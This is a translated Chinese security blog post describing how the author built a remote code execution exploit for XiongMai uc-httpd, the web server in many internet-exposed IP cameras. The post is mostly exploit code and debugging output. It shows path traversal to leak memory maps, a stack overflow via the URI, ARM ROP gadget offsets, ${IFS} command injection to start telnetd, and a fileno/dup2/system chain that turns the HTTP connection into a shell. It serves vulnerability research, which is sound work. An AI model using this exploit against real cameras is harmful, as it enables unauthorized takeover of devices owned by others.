---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  通过 ROP 实现 RCE   
born0monday  securitainment   2025-02-12 21:13  
  
> ROPing our way to RCE  
  
  
在红队评估中，仅仅发现一个 XSS 或基本的配置错误往往是不够的，实现 RCE 才是真正的目标。在一次评估中，我们遇到了 XiongMai 的 uc-httpd，这是一个在全球无数 IP 摄像头中使用的轻量级 web 服务器。根据 Shodan 的数据，大约有 7 万个该软件的实例在互联网上公开暴露。尽管它有严重漏洞的历史，但似乎没有现成的漏洞利用能提供代码执行功能，所以我决定开发一个。  
  
最初的计划是针对 CVE-2018-100881  
,这是一个缓冲区溢出漏洞，现有的漏洞利用2  
只能使服务器崩溃但无法获得 RCE。但就像大多数这样的探索一样，很少有直接的路径，更多时候需要适应和调整。因此在这个过程中，我发现了新的路径，学习了 ARM 架构，并构建了一个 ROP chain，它通过 web 请求传递并重用相同的连接作为 shell。谁还需要反向 shell 呢？让我们从故事的开头讲起。  
## 分析  
  
在进行任何漏洞利用之前，我们需要了解漏洞。首先，我需要获取 uc-http 的源代码或编译后的二进制文件。不出所料，这个软件不是开源的。但很幸运的是有 CVE-2017-75773  
,这是一个非常简单的目录遍历漏洞，允许从受影响的 uc-http 服务器下载任意文件。通过 /proc/self/exe  
 可以下载当前运行的可执行文件 - 通常这个文件被称为 Sofia  
 - 用于分析。  
  
我使用常规的 file  
 和 checksec4  
 工具检查目标二进制文件。如下所示，这是一个 ARM 32 位动态链接的可执行文件。  
```
$ file Sofia
Sofia: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped

```  
```
$ checksec --file=Sofia
RELRO           STACK CANARY      NX            PIE
No RELRO        No canary found   NX disabled   No PIE 

```  
  
没有 Relocation Read-Only (RELRO),这意味着 Global Offset Table (GOT) 是可写的，没有用于检测栈溢出的 stack canary，并且禁用了 no-execute (NX),允许在栈上执行 shellcode。此外，由于它不是位置无关可执行文件 (PIE),二进制文件总是加载在固定地址。  
  
我启动 Ghidra 对二进制文件进行反编译并探索其内部工作原理。通过交叉引用二进制文件中的日志输出 (在触发现有漏洞利用时) 和发现的字符串，我能够定位到一个似乎充当 HTTP dispatcher 的函数 (稍后会详细介绍具体的调试环境)。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMdNqtzMibt5ibQibbEYuUZb854iagJ669zAjY5sKY0qvk5u0oYoPGD2vNiavjnHmoSWuFN2ILOqiaCOFdg/640?wx_fmt=png&from=appmsg "")  
  
Sofia 二进制文件的反编译 HTTP dispatcher  
  
在这个函数中很容易发现 CVE-2018-100881  
。常见的可疑函数 strcpy  
 被用来将 HTTP 请求体中的 username  
 和 password  
 参数复制到一些数据段中。  
```
substring = strtok((char *)0x0,"&");
strcpy(&DATA_USERNAME,substring + 9);
substring = strtok((char *)0x0,"&");
strcpy(&DATA_PASSWORD,substring + 9)

```  
  
通过检查这些数据段，我发现这些缓冲区的长度都是 20 bytes。因此，超过 20 个字符的用户名和密码会导致相应的缓冲区溢出。我还发现这些缓冲区位于二进制文件的 .bss  
 数据段中，这对于劫持程序执行来说并不理想。不过，我注意到在该段中还有一些函数指针，理论上可以通过这种溢出来覆盖这些指针，从而重定向执行流程。  
  
然而，在浏览 dispatcher 函数的其余部分时，我发现了另一个漏洞 (后来我知道这是 CVE-2022-45460),这个漏洞对我的目标来说似乎更有前途。让我们来看看它。  
```
iVar1 = strcmp((char *)__s1,".lang");
if (iVar1 == 0) {
    sprintf(filepath,"%s/%s","/mnt/custom",&DAT_FILEPATH);
}
else {
    substring = strstr((char *)uri,"mns.cab");
    if (substring == (char *)0x0) {
        strstr((char *)uri,"logo/");
 sprintf(filepath,"%s/%s");
    }
    else {
        sprintf(filepath,"%s/%s","/usr/mobile",uri);
    }
}
iVar1 = stat(filepath,&stat_struct);
if (iVar1 != 0) {
    if ((filepath[0] != '\0') && (iVar1 = atoi(filepath), 0 < iVar1)) {
        DAT_006e9324 = iVar1;
        sprintf((char *)&uStack_68,".%s","/index.htm");
        FUN_003376cc(socket_stream,&uStack_68,0);
        return 0;
    }
    write_response_header(socket_stream,0x68);
    fwrite("<html><head><title>404 File Not Found</title></head>\n",1,0x35,socket_stream);
    fwrite("<body>The requested URL was not found on this server</body></html>\n",1,0x43,socket_stream);
    return 0;
}

```  
  
这段代码显示 URI 和文件路径使用 sprintf  
 进行拼接，再次没有进行任何边界检查。特别有趣的是用户可控制的 URI 与字符串 /usr/mobile  
 拼接的分支。在这种情况下，溢出发生在我称为 filepath  
 的栈变量上。栈溢出非常强大，因为函数返回地址通常存储在栈上，这使得在溢出期间可以覆盖它们并重定向程序的执行。由于没有 stack canaries 来阻止利用，这应该相对容易被利用。  
## 调试环境搭建  
  
在深入研究漏洞之前，我想搭建一个专用的测试环境进行调试。我的目标是避免依赖任何硬件设备。在不使用任何现有漏洞利用的情况下，我也无法访问设备来部署调试器。  
  
因此，我首先使用之前提到的目录遍历漏洞3  
转储文件系统。然后我尝试使用 chroot  
 和 QEMU 的 ARM System emulator5  
来搭建一个纯虚拟化环境。这种方法运行了一段时间，但最终在内存寻址方面表现出看似奇怪的行为。  
  
我手头还有一个 Raspberry Pi，所以我决定试一试。我将收集到的 rootfs 复制到 Pi 上，并获取了静态编译的 gdbserver6  
和 bash  
(gdb 需要) 二进制文件。然后我在 Pi 的 chroot 环境中启动了 gdbserver  
。  
```
$ sudo mount --bind /proc/ rootfs/proc
mount: (hint) your fstab has been modified, but systemd still uses
       the old version; use 'systemctl daemon-reload' to reload.
pwn@raspberrypi:~ $ sudo chroot rootfs/ sh
# ls
bin        dev        gdbserver  linuxrc    proc       tmp        utils
boot       etc        lib        mnt        sbin       usr        var
# ./gdbserver :8888 Sofia
Process Sofia created; pid = 911
Listening on port 8888
Remote debugging from host 192.168.2.1, port 64996

```  
  
然后我使用 gdb-multiarch  
 从我的机器连接到它。  
```
$ gdb-multiarch
GNU gdb (Debian 15.2-1+b1) 15.2
Copyright (C) 2024 Free Software Foundation, Inc.
(...)
gef➤ gef-remote 192.168.2.2 8888

```  
  
最终的调试环境设置大致如下7  
 8  
:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMdNqtzMibt5ibQibbEYuUZb85NicKnBmdias0Mp6ibv2iarynw3pKvyXoe2nJiay63FiadwTsZgYE0ibn9qj8g/640?wx_fmt=png&from=appmsg "")  
  
使用 GDB-Server 和 GEF-client 的 Raspberry Pi 调试环境  
  
这种设置允许在攻击者机器上使用 GEF9  
 来设置断点并远程调试 Pi 上的目标。完美。  
## 触发漏洞  
  
有了上述环境设置，我们就可以尝试触发已识别的漏洞。这个过程与任何此类 pwn 二进制利用挑战没有什么不同。要控制程序执行，我们首先需要确定输入在栈上覆盖特定偏移量的位置，该位置最终会被弹出到程序计数器 (PC) 中。通过发送唯一的模式并观察程序崩溃时哪些字节最终出现在 PC 中，我们可以精确定位偏移量。唯一需要记住的是要始终以 .mns.cab  
 结束 URI，以确保命中正确的代码路径。  
```
import sys
import socket

payload = b""
payload += 304 * b"A" + b"BBBB"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((sys.argv[1], int(sys.argv[2])))
    sock.send(b"GET /" + payload + b".mns.cab HTTP/1.1")
    sock.send(b"\r\n\r\n")

    print(sock.recv(1024))

```  
  
为了观察服务器端发生的情况，我在漏洞部分之后的返回语句处设置了一个断点，就在第二次调用 fwrite  
 之后。如下所示，寄存器 r4 到 r10 从栈中弹出，然后是 PC。使用上述 Python 脚本，这些寄存器被填充为字符 A，而 PC 被设置为 BBBB  
，标记了控制流劫持的入口点。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMdNqtzMibt5ibQibbEYuUZb858l4iayviciaqQUe9bcluUiaPJzZ1gr04xqbB2BmCTPD2yIM7l80m0MXY9g/640?wx_fmt=png&from=appmsg "")  
  
触发缓冲区溢出漏洞  
## 构建 Exploit  
  
在这一点上有几件事需要提及。虽然 NX 被禁用，这意味着应该有一个可执行的栈，但我对此并不完全确定。在我的 Raspberry Pi 设置中，栈总是被标记为 rw  
 而不是 rwx  
。尝试从栈中执行 shellcode 失败了。因此我（错误地）假设在真实设备上也是如此。我没有过多考虑这一点，继续计划构建 ROP chain。  
  
ROP (Return-Oriented Programming) chain 是一种在漏洞利用中使用的技术，攻击者利用程序内存中已存在的小代码片段或称为 gadgets  
 的部分。通过将这些 gadgets 链接在一起，他们可以执行任意代码而无需注入任何新内容。  
  
此外，虽然 Sofia  
 二进制文件本身禁用了 PIE，但包含的库启用了 PIE，因此我也假设启用了 ASLR。在构建 ROP chain 时，这意味着需要绕过 ASLR 才能使用来自 libc 等包含库的 gadgets。  
  
另一个需要记住的重要事情是，由于我们使用 sprintf  
 进行溢出，payload 不能包含空字节，否则会被截断。此外，在进一步检查反编译部分后，我发现空格也会被去除。  
### ASLR 绕过  
  
因为 Sofia  
 二进制文件未启用 PIE，即使启用了 ASLR，它也会始终加载到相同的内存区域。然而，由于二进制文件被映射到仅跨越地址空间低 3 字节的区域，每个地址在其最高有效字节中都包含一个空字节。这意味着，至少对于 ROP chain 的入口点，不能使用来自 Sofia  
 二进制文件本身的 gadgets。因此我专注于包含的 libc，但由于 libc 是用 PIE 编译的，绕过 ASLR 变得至关重要。  
  
正如你可能猜到的，我们的路径遍历漏洞再次派上用场，这次是用来绕过 ASLR。除了转储 /proc/self/maps  
 以检索 Sofia  
 进程的内存映射从而确定所有包含库的基地址外，这里没有什么特别的魔法。  
### ARM 架构  
  
由于构建 ROP chain 需要理解底层架构，我们首先必须介绍一些关于 ARM 架构的非常基本的概念。如果你已经熟悉这些内容，可以跳过这部分。  
  
ARM 是一种 RISC 架构，这意味着它使用较小的简单指令集，而不是像 x86 那样的复杂指令。它在移动设备和嵌入式系统中被广泛使用。  
  
ARM 的一个独特方面是 Thumb 指令集。Thumb 是最常用的 32 位 ARM 指令的子集，每条指令只有 16 位长。这些指令与其 32 位对应指令具有相同的效果，但允许更紧凑、高效的代码。ARM 处理器可以在执行期间在 ARM 和 Thumb 模式之间切换10  
。  
  
对于 ROP chains 来说，ARM 的调用约定11  
特别重要，因为它规定了如何传递函数参数以及如何管理控制流。ARM 有 16 个通用寄存器，从 R0 到 R15。寄存器 R0-R3 用于传递前四个函数参数，如果函数有超过四个参数，其余的放在栈上。R4-R11 用于在函数内存储局部变量。函数的返回值存储在 R0-R3 中。  
  
在 ARM 中的跳转主要有四种类型：B、BL、BX 和 BLX。这些指令控制程序流程，在保存返回地址或在 ARM 和 Thumb 模式之间切换的能力上有所不同。下表总结了它们的属性12  
：  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;min-width: 85px;"><section><span leaf="">指令</span></section></th><th valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;min-width: 85px;"><section><span leaf="">功能</span></section></th><th valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;min-width: 85px;"><section><span leaf="">保存返回地址 (LR)</span></section></th><th valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;min-width: 85px;"><section><span leaf="">能否切换指令集？</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">B</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">简单分支</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">否</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">否</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">BL</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">带链接的分支</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">是</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">否</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">BX</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">分支并交换指令集</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">否</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">是（取决于目标）</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">BLX</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">带链接和交换指令集的分支</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">是</span></section></td><td valign="top" style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;min-width: 85px;"><section><span leaf="">是（取决于目标）</span></section></td></tr></tbody></table>  
  
当返回地址被保存时，意味着分支后的下一条指令的地址被存储在链接寄存器 (LR) 中。这允许程序在分支或函数调用完成后返回到这一点。正如我们稍后会看到的，这反映在函数序言和尾声中。在函数序言中，LR 寄存器通常被压入栈中以保存返回地址，在尾声中，它被弹回到 PC 中以确保程序跳回调用函数。  
### 寻找 Gadgets  
  
让我们谈谈构建 ROP chain。归根结底，这个过程就是找到能一起工作以实现特定目标的有用 gadgets。在我的第一次尝试中，我着手构建一个执行 system("/bin/sh")  
 的链。  
  
为此，我需要能将栈指针移动到 R0（因为 R0 是传递第一个参数的位置）然后跳转到加载的 libc 中包含的 system  
 函数的 gadgets。这样，我就可以使用栈来放置我想要执行的命令。  
  
要找到这些 gadgets，广泛使用的工具 Ropper13  
非常方便。它专门用于从二进制文件中识别和提取 ROP gadgets。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMdNqtzMibt5ibQibbEYuUZb85mhs9d7obIqHSxk77ZanuC5NibDOib3qxdbLaGJqq9QoUSZn5L99ia2eRA/640?wx_fmt=png&from=appmsg "")  
  
使用 Ropper 寻找 gadgets  
  
经过一段时间的搜索，我想出了以下解决方案：  
```
0x000175cc: pop {r3, pc}
0x000535e8: system
0x000368dc: mov r0, sp; blx r3

```  
  
第一个 gadget 将 R3 设置为可控值并跳转到下一地址。第二个 gadget (mov r0, sp; blx r3  
) 将栈指针移动到 R0（system 函数的第一个参数）并跳转到 R3（我们之前设置为 system 函数的地址）。  
  
函数地址（例如 system）可以通过 readelf -s  
 确定。但需要特别注意，必须将相应二进制文件或库的基地址添加到输出中看到的偏移量。这能确保在构建 ROP chain 时使用正确的地址。  
```
$ readelf -s libc.so.0 | grep system
   659: 0003dfc0    80 FUNC    GLOBAL DEFAULT    7 svcerr_systemerr
   853: 000535e8   116 FUNC    WEAK   DEFAULT    7 system
   864: 000535e8   116 FUNC    GLOBAL DEFAULT    7 __libc_system

```  
  
正如我们之前所了解的，payload 中不能包含任何空格。不过我发现可以通过经典的 ${IFS}  
 技巧14  
轻松绕过这个限制。  
  
将所有内容整合后，我最终构建的 exploit 大致如下所示（完整源代码参见  
此处  
）：  
```
def main():
    maps = fetch_maps()
    libc, libc_base = parse_maps(maps)

    payload = b""
    payload += 304 * b"A"
    payload += pack("<I", libc_base + GADGETS[libc][0]) # pop {r3, pc}
    payload += pack("<I", libc_base + GADGETS[libc][1]) # system
    payload += pack("<I", libc_base + GADGETS[libc][2]) # mov r0, sp; blx r3

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((HOST, PORT))
        sock.send(b"GET /" + payload + CMD.replace(b" ", b"${IFS}") + b";.mns.cab HTTP/1.1")
        sock.send(b"\r\n\r\n")
    
        print(sock.recv(1024))

```  
  
由于无法远程交互的/bin/sh  
命令实际作用有限，我改用telnetd  
在 1337 端口启动本地 telnet 服务器。这使我能够连接并获取 shell。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMdNqtzMibt5ibQibbEYuUZb85JuoyMaHY7t8jNeSVricM6hribJab22OtRFjY8uvia6ewgrwka4QS02Yicg/640?wx_fmt=png&from=appmsg "")  
  
通过 telnetd 实现简单漏洞利用获取 shell  
  
成功实现 RCE！但自从分析反编译的 dispatcher 函数后，另一个可能的解决方案始终萦绕在我脑海中。我不断思考这个方案是否真的可行。是时候验证了——进入第二部分。  
### 第二部分 - 更进一步的探索  
  
让我们先回顾因缓冲区溢出而将控制流转交给我们指定的代码区域。可以看到在 return 语句之前有两个fwrite  
调用，它们将响应写入原始请求客户端的socket_stream  
连接。  
  
这使我得出以下两个假设：  
- ROP 链触发时连接尚未关闭  
  
- socket_stream  
的引用很可能仍存留在某个寄存器中  
  
```
    write_response_header(socket_stream,0x68);
    fwrite("<html><head><title>404 File Not Found</title></head>\n",1,0x35,socket_stream);
    fwrite("<body>The requested URL was not found on this server</body></html>\n",1,0x43,socket_stream);
    return 0;
}

```  
  
这让我想起 CTF 比赛中那些通过socat  
暴露在 socket 上的漏洞二进制文件。在这种情况下，编写 shellcode 实现远程代码执行（RCE）的常用方法如下15  
：  
```
fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // create socket
connect(fd, (struct sockaddr *) &serv_addr, 16); // connect
dup2(fd, 0); // dup socket and STDIN
dup2(fd, 1); // dup socket and STDOUT
dup2(fd, 2); // dup socket and STDERR
execve("/bin/sh", 0, 0); // execute /bin/sh

```  
  
socket()  
 函数通过指定的 domain、type 和 protocol 创建新套接字。connect()  
 随后建立与目标地址的连接。连接成功后，三次使用 dup2()  
 将套接字文件描述符重定向到标准输入（STDIN）、标准输出（STDOUT）和标准错误（STDERR），从而有效地将 shell 的 I/O 绑定到套接字。最后，execve()  
 执行 /bin/sh  
，通过已建立的连接生成一个通信 shell。  
  
在上述情境中，我已经完成了该策略的一半。由于已经拥有 socket/connection，剩下的工作只需执行 dup2  
 调用和 system  
 调用即可，对吗？这将允许我复用已建立的连接作为 shell。  
  
虽然我持有 FILE *stream  
，但 dup2  
 需要整数文件描述符，因此需要额外步骤——调用 fileno()  
 来获取对应的文件描述符。这使得整个计划大致呈现如下结构。  
```
fd = fileno(stream)
dup2(fd, 0)
dup2(fd, 1)
dup2(fd, 2)
system("/bin/sh")

```  
  
不过在着手构建 ROP 链之前，我需要先验证之前的假设。为此，我在第二个fwrite  
调用前和返回语句处分别设置了断点。当触发第一个断点时，R3 寄存器（即fwrite  
的第四个参数）中应该存有socket_stream  
的引用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMdNqtzMibt5ibQibbEYuUZb85EbRIibnN49MkBdD4EYlGCbknww2d7kluRA3Za5sricTZfqEaWro5JNog/640?wx_fmt=png&from=appmsg "")  
  
GDB 中在 fwrite 调用前查看 R3 寄存器  
  
在第二个断点处，我们可以看到 R3 中仍然保持着相同的值，这证实了当 ROP 链触发时我们确实可以获取到socket_stream  
的引用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMdNqtzMibt5ibQibbEYuUZb85dcPa8Y5dJbPRuOWu63osGCPdM8w6JmQk5nsyiacRVSKBnpV5IIaiaYTg/640?wx_fmt=png&from=appmsg "")  
  
ROP 链触发前在 GDB 中查看 R3 寄存器  
  
在此过程中，我还注意到用于触发断点的curl  
命令在程序暂停期间并未返回。这意味着连接仍然保持打开状态。好消息是，之前的假设似乎成立。  
  
下一步，构建 ROP 链。我继续寻找能将参数移入正确寄存器并调用目标函数的 gadgets。我原以为所有函数都会通过pop {pc}  
返回，因此不需要考虑 gadgets 和函数调用之间的衔接问题。事实证明这个假设至少部分错误。  
  
虽然pop {pc}  
的假设成立，但我仍无法简单串联调用。为什么？因为我忽略了函数序言（prologue）。以fileno  
的函数序言为例，我们可以看到 R4-R8 寄存器被压入栈中。这确保了函数返回时寄存器状态可以恢复（被调用者保存寄存器）。但我们也注意到链接寄存器（LR）同样被压入栈中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMdNqtzMibt5ibQibbEYuUZb85XZTcicRPboQhHibYM0iaCYQnabaqM9gFb3wrVRveX6mJ39d1mTFGvmo7g/640?wx_fmt=png&from=appmsg "")  
  
查看 fileno 反汇编后的函数序言  
  
结合之前讨论的不同跳转指令知识，这就很好理解了。函数通过bl  
指令调用，该指令会将 LR 设置为跳转指令后的下一条指令地址。这确保了函数退出时能正确返回到调用位置。  
  
然而对于构建 ROP 链来说，这似乎是个坏消息，因为我无法真正控制 LR 寄存器。我继续寻找能在跳转到函数前设置 LR 的 gadgets。尽管解决方法对你来说可能显而易见，但我还是花了一整晚才意识到：我们可以直接跳过函数序言。这样完全无需担心 LR 的值。于是我给每个函数符号简单添加了+0x4  
偏移，问题迎刃而解。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMdNqtzMibt5ibQibbEYuUZb85yVUyjJlzbUFz3a18VEfUHnD6F6gHiaibmy5opb4VV26WF7YibzwNrpnTg/640?wx_fmt=png&from=appmsg "")  
  
查看 fileno 反汇编后的函数尾声  
  
唯一的要求是在栈上添加填充数据来适配函数尾声。对于fileno  
来说，总共需要 5×8 字节的填充。这实际上非常有用，因为它允许我将这些寄存器设置为任意值。  
  
我继续拼接各个部件。按照既定方案，首先调用fileno  
。  
```
p = b""
p += p32(libc_base + 0xf964) # mov r0, r3; pop {r4, pc}
p += b"XXXX" # r4 padding
p += p32(libc_base + 0x3102c + 0x4) # fileno

```  
  
第一个 gadget 将套接字引用 socket_stream  
 移入 R0 寄存器，确保其作为参数传递给 fileno  
。调用完成后添加填充数据以正确处理函数尾声（epilogue）。ldmia  
 结构可视为等同于之前讨论的 pop  
 操作。由于 R5 寄存器后续将使用，我提前在其中存储了 dup2  
 的地址。  
```
# fileno epilogue: ldmia sp!,{r4,r5,r6,r7,r8,pc}
p += b"XXXX" # r4 padding
p += p32(libc_base + 0xce5c + 0x4) # r5 -> dup2
p += b"XXXX" # r6 padding
p += b"XXXX" # r7 padding
p += b"XXXX" # r8 padding

```  
  
接下来是调用dup2  
的环节。为了实现标准输入、标准输出和标准错误的重定向，需要分别调用三次该函数。在这三次调用中，R0 寄存器应始终设置为通过fileno  
获取的文件描述符，而 R1 寄存器的值需要依次设置为 0（STDIN）、1（STDOUT）和 2（STDERR）。由于 R1 寄存器当前已初始化为 0，第一次调用可以直接完成无需额外设置。  
```
p += p32(libc_base + 0xce5c + 0x4) # dup2, r1 = 0
# dup2 epilogue: ldmia sp!,{r7,pc}
p += b"XXXX" # r7 padding

```  
  
在第二次调用时，我找到了一个 gadget，该 gadget 会在跳转到 R5 寄存器中存储的地址（此时 R5 中已存有dup2  
的地址）之前，将 1 移入 R1 寄存器。  
```
p += p32(libc_base + 0x1cdcc) # mov r1, #1; mov r2, r6; blx r5
# dup2 epilogue: ldmia sp!,{r7,pc}
p += b"XXXX" # r7

```  
  
遗憾的是，我始终未能找到适用于第三次调用的可行 gadget。因此，这个问题将作为练习留给读者自行解决 :)  
  
最后只需复用第一个简单漏洞利用中的 ROP 链来生成 shell。至此所有准备工作均已完成。  
```
p += p32(libc_base + 0x175cc) # pop {r3, pc};
p += p32(libc_base + 0x535e8) # system
p += p32(libc_base + 0x368dc) # mov r0, sp; blx r3

```  
  
终于到了测试成果的时刻。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCMdNqtzMibt5ibQibbEYuUZb85fwS0SluqAHpCLuT6FlAaIibvQyBCbJksr5myIeIapre7DWYUtNYYjYA/640?wx_fmt=png&from=appmsg "")  
  
通过连接复用实现 shell 的最终漏洞利用  
  
成功！这个方案比第一次尝试优雅得多。既不需要启动 telnetd 服务，也无需建立反向 shell！  
  
最终漏洞利用的源代码可以在  
这里  
找到。  
## 总结  
  
正如前文所暗示的，我在完成漏洞利用开发后才发现，本文讨论的这个漏洞早已被识别并追踪为 CVE-2022-4546016  
。而且已有公开的利用方案17  
通过栈上的 shellcode 实现 RCE。显然，我最初对产品的研究不够彻底。尽管如此，在探索不同利用方式的过程中，我获得了许多乐趣并学到了宝贵经验。鉴于已有公开的利用方案，我们决定公开完整的漏洞利用代码——尽管在其他情况下我们通常会避免这样做。  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
